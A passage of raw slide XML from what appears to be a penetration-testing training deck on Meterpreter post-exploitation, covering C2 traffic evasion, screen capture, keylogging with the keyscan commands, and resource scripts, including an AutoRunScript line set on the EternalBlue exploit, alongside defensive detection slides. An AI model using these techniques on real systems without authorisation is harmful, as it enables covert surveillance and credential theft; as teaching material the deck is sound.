            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Malleable Profiles:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> Ensure your traffic profile mimics normal HTTP/S traffic (e.g., custom User-Agents, realistic jitter/sleep timers). This prevents the "heartbeat" signal from standing out in network logs.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Transport Failover:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> As discussed previously, use multiple communication channels (transports) to ensure resiliency without needing to re-infect the system, which would create new, noisy execution events.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="8146617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DF8A8-3768-3F6D-46F5-9996BCC9533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7BF3A04C-3BB0-AFBF-B6E9-25422BDE8AB6}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="92500" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Defensive Perspective: How to Detect</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>To understand your own footprint, you should view your activities through the lens of a defender:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Sysmon:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> Look for Event IDs related to process creation (1), process access (10), and network connections (3).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Memory Forensics:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> Tools like </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Volatility</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> can detect injected code in memory, even if it is not on disk.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Log Aggregation:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> Centralized SIEMs correlate log clearing events with the specific user account and source IP, making manual clearing ineffective against mature security programs.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="12762675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7F085-1693-71A3-78EF-BC3DECA524C0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="90000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>the get-desktop and keystroke sniffing</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4475EC11-FB7B-BB00-00E6-1A0F17BD1499}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>In Meterpreter, "getting the desktop" and "keystroke sniffing" are post-exploitation functions used to gain visibility into a user's activity and capture sensitive information. These are powerful features often used during authorized penetration tests to demonstrate the potential impact of a compromise.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="42816614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512D4-F3F7-6FAB-FB5A-7745D2ACC12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7F72895A-D910-AA86-BCC6-9506BD062191}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="70000" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>1. Interacting with the Desktop</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Meterpreter provides several ways to interact with the target's graphical environment. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>screenshot</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>: This command captures the current active desktop and saves it as an image file on your local machine. It is a quick way to see what the user is currently working on or to check for sensitive information visible on the screen. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>screenshare</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>: This is a more interactive version of the screenshot command. It provides a real-time (streamed) view of the user’s desktop, allowing you to observe their actions as they happen.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0" err="1"/>
              <a:t>uictl</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>: This command allows you to control the user interface. You can enable or disable the keyboard and mouse (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0" err="1"/>
              <a:t>uictl</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> disable keyboard or </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0" err="1"/>
              <a:t>uictl</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> disable mouse), which can be used to prevent a user from interfering while you are performing tasks on their system. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="30073514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31ACA-5A42-C8FA-51EC-61F11E59F8C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1F1CED8-8C47-2DB3-1FBA-2E2F0AD9F2BE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="70000" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>2. Keystroke Sniffing (Keylogging)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Keystroke sniffing records every key pressed by the user on the target system. This is a primary method for capturing credentials, private communications, and other sensitive input.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>The functionality is managed through the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0" err="1"/>
              <a:t>keyscan</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> suite of commands:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0" err="1"/>
              <a:t>keyscan_start</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>: This initializes the keystroke logger. It hooks into the system to begin capturing input in the background. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0" err="1"/>
              <a:t>keyscan_dump</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>: This command retrieves the captured keystrokes and outputs them to your console. It is important to dump the data periodically to ensure you don't lose it if the session crashes or is closed. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0" err="1"/>
              <a:t>keyscan_stop</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>: This terminates the logging process, stopping the collection of keystrokes.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="15585169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8F9D3-4196-2E2A-F1AD-22464C7A1280}"/>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FF501F8F-AB15-950E-22D5-5A764F74F1B7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="55000" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Security &amp; Detection Perspective</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>From a defensive standpoint, these activities are "high-noise" and are frequently monitored by Endpoint Detection and Response (EDR) and security software.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Detection:</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="571500" lvl="1" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>API Hooking:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> Keyloggers typically rely on hooking APIs (e.g., </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0" err="1"/>
              <a:t>SetWindowsHookEx</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> in Windows). Modern EDRs heavily monitor processes that attempt to hook into user input functions. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="571500" lvl="1" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0" err="1"/>
              <a:t>Behavioral</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t> Analysis:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> If an unknown process suddenly begins capturing input or taking frequent screenshots, EDR platforms will flag this as suspicious </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0" err="1"/>
              <a:t>behavior</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="571500" lvl="1" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Memory Scanning:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> Forensic tools can often detect the presence of the Meterpreter </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0" err="1"/>
              <a:t>keyscan</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> thread residing in a process's memory space.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Defensive Countermeasures:</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="571500" lvl="1" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Secure Desktop:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> Windows uses a "Secure Desktop" for UAC prompts and login screens, which intentionally isolates input from standard user-mode processes to prevent them from being captured by keyloggers. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="571500" lvl="1" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Endpoint Integrity:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> Enforcing strict EDR policies and keeping systems patched significantly limits an attacker's ability to inject the code required for these actions to function.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="571500" lvl="1" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Credential Guards:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> Using technologies like Windows Credential Guard helps protect hashed credentials, making the information captured by a keylogger less valuable if it only contains non-sensitive data.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="8431318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6C566-8416-34EF-65ED-1F2A4DE05571}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Meterpreter resource scripts</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{3FB388DE-006B-7E84-DF3F-4C54A77B9C52}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Meterpreter </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Resource Scripts</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> are text files containing a series of Metasploit commands that you can execute automatically. They are essential for automating repetitive tasks, ensuring consistency during engagements, and quickly re-establishing a specific "post-exploitation state" after a session is restored.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2251575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C136F-9601-A22C-DA9F-E06D6ABDDA09}"/>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AF3CACF-ACA3-0541-A0B9-A153AF882D57}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Why Use Resource Scripts?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Efficiency:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> Instead of typing five commands to gather system information, you run one script.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Consistency:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> Ensures that every time you land on a target, you execute the same discovery steps (e.g., hash dumping, network enumeration).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Automation:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> Can be triggered automatically upon session creation using the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0" err="1"/>
              <a:t>AutoRunScript</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> configuration in your payload.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="28208153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1B50-4ABF-EF3C-6EF5-0B0DC19CE65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D3CB11AF-9B38-8704-CA1D-94D00E5E9882}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="25000" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>How to Create and Run Scripts</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>1. Creating the Script</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Create a text file (e.g., </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0" err="1"/>
              <a:t>recon.rc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>) and add your Meterpreter commands, one per line:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Bash</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t># Example: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0" err="1"/>
              <a:t>recon.rc</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" dirty="0" err="1"/>
              <a:t>sysinfo</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" dirty="0" err="1"/>
              <a:t>getuid</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>run post/windows/gather/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0" err="1"/>
              <a:t>check_vm</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>run post/windows/gather/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0" err="1"/>
              <a:t>enum_applications</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>screenshot</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>2. Executing the Script</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Once you have an active Meterpreter session, you can execute the script using the resource command:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Bash</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" dirty="0" err="1"/>
              <a:t>meterpreter</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> &gt; resource /path/to/your/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0" err="1"/>
              <a:t>recon.rc</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Advanced Automation: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0" err="1"/>
              <a:t>AutoRunScript</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>You can configure your payload to run a script immediately upon successful exploitation. This is often used to ensure persistence or immediate situational awareness before the connection is even fully established in your console.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>When generating your payload (e.g., via </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0" err="1"/>
              <a:t>msfvenom</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> or inside </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0" err="1"/>
              <a:t>msfconsole</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>), you can set the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0" err="1"/>
              <a:t>AutoRunScript</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> option:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Bash</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>msf6 exploit(windows/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0" err="1"/>
              <a:t>smb</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>/ms17_010_eternalblue) &gt; set </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0" err="1"/>
              <a:t>AutoRunScript</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> post/windows/manage/p</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="474866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C5319-9CDB-03AC-1A65-87090BADD0EC}"/>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1D79DEDC-A772-39BF-87D3-10BC78C0E4DE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
